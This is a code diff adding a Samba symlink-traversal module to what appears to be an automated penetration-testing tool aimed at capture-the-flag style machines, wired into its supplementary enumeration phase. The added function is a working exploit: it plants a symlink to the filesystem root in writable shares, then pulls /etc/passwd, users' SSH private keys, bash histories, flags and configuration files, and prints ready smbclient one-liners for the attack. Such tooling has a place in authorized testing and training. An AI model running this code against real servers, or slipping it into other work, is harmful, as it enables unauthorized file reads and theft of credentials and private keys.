@@ -4644,6 +4644,88 @@ def ai_block_report(target, services, vulns, loot, args, outdir):
                 loot.add('notes', 'AI suggested manual path -> BLOCKERS_AND_NEXT_STEPS.md')
 
 
+def run_smb_symlink_traversal(target, services, outdir, args, tools, loot=None, context=None):
+    """Samba writable-share symlink directory traversal: plant a symlink to '/'
+    inside a writable share and read arbitrary files (SSH keys, flags, /etc/passwd,
+    web roots, smb.conf) when the server allows 'wide links'/'follow symlinks'.
+    A general, high-impact SMB capability. Active-gated (it writes a symlink)."""
+    vulns = []
+    svc = {p: s.get('service', '').lower() for p, s in services.items()}
+    has_smb = (445 in services or 139 in services
+               or any('smb' in v or 'netbios' in v or 'microsoft-ds' in v for v in svc.values()))
+    if not has_smb or not shutil.which('smbclient'):
+        return vulns
+    context = context if context is not None else {}
+    if not active_enabled(args):
+        _recommend(loot, f"smbclient //{target}/<writable_share> -N -c 'symlink / x'; then "
+                   f"get x/etc/passwd , x/home/*/.ssh/id_rsa , x/root/root.txt",
+                   "Samba symlink traversal (arbitrary file read via writable share)")
+        return vulns
+
+    # discover shares (reuse context, else list)
+    shares = list(context.get('smb_shares') or [])
+    if not shares:
+        _, ls, _ = _run(['smbclient', '-N', '-L', f'//{target}/'], timeout=60)
+        shares = re.findall(r'^\s*(\S+)\s+Disk', ls, re.M)
+    shares = [s for s in shares if s.upper() not in ('IPC$', 'PRINT$', 'ADMIN$', 'C$')]
+    if not shares:
+        return vulns
+
+    subsection("SMB Symlink Directory Traversal")
+    loot_dir = outdir / 'smb_symlink_loot'
+    loot_dir.mkdir(exist_ok=True)
+    high_value = ['etc/passwd', 'home/scott/user.txt', 'root/root.txt',
+                  'home/scott/.ssh/id_rsa', 'root/.ssh/id_rsa', 'etc/samba/smb.conf',
+                  'home/scott/.bash_history', 'var/www/html/config.php']
+
+    for sh in shares:
+        link = 'lk%d' % (int(time.time()) % 100000)
+        # plant a symlink to filesystem root inside the writable share
+        _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'symlink / {link}'], timeout=30)
+        # test traversal by reading /etc/passwd through the symlink
+        pf = loot_dir / f'passwd_via_{sh}'
+        _run(['smbclient', f'//{target}/{sh}', '-N', '-c',
+             f'get {link}/etc/passwd {pf}'], timeout=30)
+        if not (pf.exists() and 'root:' in pf.read_text(errors='ignore')):
+            # some servers need the link relative or the share root itself; try '.'
+            continue
+        good(f"  SYMLINK TRAVERSAL works on //{target}/{sh} — arbitrary filesystem read")
+        if loot:
+            loot.add('auth_findings', f"Samba symlink traversal via writable share '{sh}' -> arbitrary file read")
+            loot.add_step(f"SMB: symlink traversal on {sh} -> read SSH keys / flags / configs")
+        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
+                     'desc': f'Samba symlink directory traversal via writable share "{sh}" (arbitrary file read as the Samba user)',
+                     'cve': '', 'exploit': f"smbclient //{target}/{sh} -N -c 'symlink / x; get x/root/root.txt'",
+                     'severity': 'critical'})
+        # discover real users from /etc/passwd, then pull each user's flag + SSH key
+        passwd = pf.read_text(errors='ignore')
+        users = [m.group(1) for m in re.finditer(r'^([a-z_][a-z0-9_-]*):x:\d{4,}:', passwd, re.M)]
+        for u in users:
+            high_value += [f'home/{u}/user.txt', f'home/{u}/.ssh/id_rsa',
+                           f'home/{u}/.bash_history', f'home/{u}/local.txt']
+        for tgt in dict.fromkeys(high_value):
+            dest = loot_dir / tgt.replace('/', '_')
+            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'get {link}/{tgt} {dest}'], timeout=25)
+            if dest.exists() and dest.stat().st_size:
+                txt = dest.read_text(errors='ignore')
+                if not txt.strip():
+                    continue
+                good(f"    read {tgt}: {txt.strip()[:80]}")
+                if loot:
+                    loot.add('files', f'symlink://{sh}/{tgt} -> {dest}')
+                    loot.scan_output(txt)
+                    if tgt.endswith(('user.txt', 'root.txt', 'local.txt')) and re.fullmatch(r'[0-9a-f]{32}\s*', txt.strip() + ' '):
+                        loot.add('flags', f"{tgt} = {txt.strip()}")
+                    elif tgt.endswith(('user.txt', 'root.txt', 'local.txt')):
+                        loot.add('flags', f"{tgt} = {txt.strip()[:64]}")
+                    if 'PRIVATE KEY' in txt:
+                        keyf = loot_dir / (tgt.replace('/', '_'))
+                        loot.add('keys', f'SSH private key {tgt} -> {keyf} (chmod 600; ssh -i)')
+                        loot.add_step(f"Foothold: SSH private key for {tgt.split('/')[1]} captured -> ssh -i")
+        break
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -5312,6 +5394,8 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
                                            domain=_ad_domain, context=p5_context)
     # 1b. Pull & mine readable SMB shares / NFS exports (loot lives inside them)
     shellshock_vulns += run_share_mining(target, services, outdir, args, tools, loot)
+    # 1c. Samba symlink traversal on writable shares -> arbitrary file read (SSH keys/flags)
+    shellshock_vulns += run_smb_symlink_traversal(target, services, outdir, args, tools, loot, context=p5_context)
     # 2. Credential brute against auth services (consumes ad_users.txt)
     shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
                                                context=p5_context)
